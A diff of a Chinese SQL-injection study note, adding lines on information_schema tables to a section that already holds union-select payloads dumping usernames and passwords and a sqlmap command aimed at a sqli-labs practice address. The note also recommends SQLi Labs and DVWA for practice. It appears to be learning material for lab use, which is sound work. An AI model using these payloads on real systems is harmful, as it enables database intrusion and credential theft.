@@ -23,6 +23,11 @@ id=-1' union select 1,2,group_concat(column_name) from information_schema.column
 id=-1' union select 1,2,group_concat(username,0x3a,password) from users#    //爆值，最后输出以username:password格式输出
 ```
 
+```
+Information_schema.tables //存储了数据库中所有的表信息
+Information_schema.columns where table_name = ‘a’  //存储了数据库内部表a中所有的字段信息
+```
+
 * ### 盲注
 * ### Bypass
 
@@ -49,8 +54,8 @@ python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms 
 ```
 
 * #### 推荐练习环境
-
 * SQLi Labs
+
 * DVWA
 
 
